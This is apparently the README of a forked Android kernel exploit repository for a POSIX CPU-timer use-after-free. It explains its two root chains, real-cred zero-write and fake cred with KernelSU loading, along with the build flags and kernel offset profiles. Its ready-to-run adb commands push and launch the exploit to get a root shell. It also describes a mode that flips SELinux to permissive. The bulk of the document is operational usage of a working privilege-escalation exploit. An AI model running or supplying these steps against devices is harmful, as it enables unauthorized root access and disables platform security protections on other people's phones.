# CVE-2026-98260 — POSIX CPU Timer LPE (spinel fork)

This is a port of the CVE-2026-98260 POSIX CPU-timer use-after-free exploit. It
gains `uid=0` on Android devices running a supported kernel. The original project
is [YuKongA/CVE-2026-98260](https://github.com/YuKongA/CVE-2026-98260); this fork
adds the profile for the **Redmi Note 15 4G (`spinel`)** and extensive local
experimentation. See [CREDITS.md](CREDITS.md).

## What the two attack chains actually do

| Mode | Mechanism | Result |
|---|---|---|
| `timer` (default) | Zero-write into the **real** `cred` structure, then `setuid(0)` and `exec sh` | `uid=0`, context `u:r:shell:s0`. This is the **stable** path used by the app. |
| `timer fake` | Build a **fake `cred`** with full capabilities and `u:r:kernel:s0`, point `task->cred` at it, then run `ksud late-load` | On the upstream-supported devices this loads KernelSU and yields `su` in `u:r:ksu:s0`. **On the spinel/MIUI firmware this path is unstable** — it either stalls in the SLUB spray or panics the kernel. |

Status observed on the original devices:

| Path | Result |
|---|---|
| real-cred zero write + `setuid(0)` + `exec sh` | `uid=0`, `u:r:shell:s0`, `ROOT_SHELL_OK` |
| fake cred + `ksud late-load` | installed `libksud.so` (uapi 6), `KSU_LOADED`, `su` in `u:r:ksu:s0` |

## Requirements

- Start identity: `adb shell` (uid 2000, `u:r:shell:s0`). The shell domain can read
  `tracefs` and `/proc/slabinfo`, which a normal app cannot.
- When the KernelSU manager (`me.weishu.kernelsu`) is installed, `fake` mode uses
  its `lib/arm64/libksud.so` automatically.

## How the build works

```sh
cd timer
NDK=~/Android/Sdk/ndk/30.0.16248370/toolchains/llvm/prebuilt/linux-x86_64/bin
$NDK/aarch64-linux-android35-clang -O2 -std=gnu11 -static \
    -fno-stack-protector -fno-pic -I. \
    -ffunction-sections -fdata-sections timer.c -o timer \
    -Wl,--gc-sections -Wl,-s -Wl,--build-id=none \
    -Wl,-z,norelro -pthread
```

`-static` is important: the upstream binary is a static ELF. Early local builds
that omitted it were dynamic (~45 KB instead of ~311 KB) and behaved differently
during the root-child `execve`.

## Kernel profiles — how matching works

Each kernel has its own constant table in `timer/kbuilds/<release>.h`, indexed by
`timer/kbuilds.h`. `timer.c` contains only logic. At startup the binary calls
`uname()` and matches the **exact** release string. On a miss it prints the known
builds and exits — it never guesses offsets.

Upstream-supported releases:

- `6.12.69-android16-6-g242e1a07f878-ab15865446-4k`
- `6.12.69-android16-6-g5fd39602326e-ab16372235-4k`

Added in this fork:

- `6.12.69-android16-6-g014ca48a80ee-ab15889839-4k` (spinel). Its constants are
  identical to `g242e1a07f878`; they were derived from boot.img analysis and
  verified against the kernel BTF (`parse_btf.py`, `fw/btf.bin` in the notes repo).

To add another kernel (detect CVE-2026-98260, write and register a profile;
exit 0 = exploitable, 3 = patched, 1 = error):

```sh
cargo build --release --manifest-path tools/extract/Cargo.toml
tools/extract/target/release/timer-extract boot.img --add
```

The `tools/*.c` programs are diagnostics for checking call sites, raw trace
records, timer leaks and the 8 KiB AF_UNIX reclamation channel.

## Usage — and what each command does

```sh
adb push timer /data/local/tmp/timer
adb shell chmod 755 /data/local/tmp/timer

# Diagnostics (no exploit triggered)
adb shell /data/local/tmp/timer build   # print kernel release + matched profile
adb shell /data/local/tmp/timer ids     # probe tracefs page event IDs
adb shell /data/local/tmp/timer leak    # leak base/cred/task only; no UAF

# Stable root shell (real cred)
adb shell /data/local/tmp/timer         # prints id + context + ROOT_SHELL_OK
adb shell /data/local/tmp/timer shell   # interactive root sh

# KernelSU attempt (fake cred + installed ksud)
adb shell 'cd /data/local/tmp && setsid ./timer fake >timer.log 2>&1 </dev/null &'
adb shell cat /data/local/tmp/timer.log
```

Success markers for `fake` on a compatible device:

```text
[ksu] ksud=.../lib/arm64/libksud.so version=ksud 3.3.1-24-g528bafc5 (uapi: 6)
KSU_LOADED
kernelsu ... Live
```

Then `adb shell /system/bin/su -c id` should report `uid=0 ... context=u:r:ksu:s0`.

## Modes added in this fork

These are documented here because the binaries in `timer/` are named after them:

| Mode | What it changes |
|---|---|
| `perm` | Performs a single zero-write to `selinux_state-7`, flipping the enforcing byte to 0. SELinux stays Permissive until reboot. Useful because `dmesg`, `tracefs` and `debug.*` props are otherwise denied to the shell domain. |
| `--ghostlock-app-call` | Detected when launched by the GhostLock app. In some experimental builds this switched to fake-cred mode; the **stable** builds ignore it and use the real-cred path. |
| props mode | When `/data/local/tmp/glk_props_mode` exists, `write_ksu_script()` emits a script that runs `setprop`/`settings` as uid 0 instead of the KernelSU handoff. Note: on this ROM `persist.sys.*` setprop is still denied by the property service. |
| `v18`–`v25` experiments | Various attempts to combine a full-capability fake cred with the stable root-child path. All either stalled or panicked on this firmware; kept for the record. |

## Safety — read this

- A failed state **parks the process and holds a zombie**. Do **not** kill it;
  rebooting is the only safe cleanup.
- Never apply `timeout` or `kill` to a parked process after triggering the UAF —
  it can panic the kernel.
- `pm kill`/`kill -9` on a stalled `libghostlock.so` was tested here and **did**
  cause a reboot. Always reboot cleanly instead.
- KernelSU soft-reboot preserves the jailbreak state; a hard reboot removes root
  as expected.

## Layout

```text
timer/timer.c      exploit logic
timer/kbuilds.h    profile index (include list + pointer table)
timer/kbuilds/     one <release>.h per kernel
timer/timer*       built binaries (static upstream build + local variants)
tools/*.c          ported diagnostic sources
tools/extract/     Rust extractor/detector (binary: timer-extract)
```

## Licence

| Path | Licence |
|---|---|
| Repository root (`timer/`, `tools/*.c`) | MIT — see [LICENSE](LICENSE) |
| `tools/extract/` | Apache-2.0 — see `tools/extract/LICENSE` |

Third-party origins: `timer/timer.c` is adapted from `woshigenm/CVE-2026-98260`
(`src/uid0.c`, `src/poc.c`, MIT); `tools/extract/` came from
`YuKongA/ghostlock-app/tools/extract_rs` (Apache-2.0).

## Créditos / Credits

Full credits: [CREDITS.md](CREDITS.md).
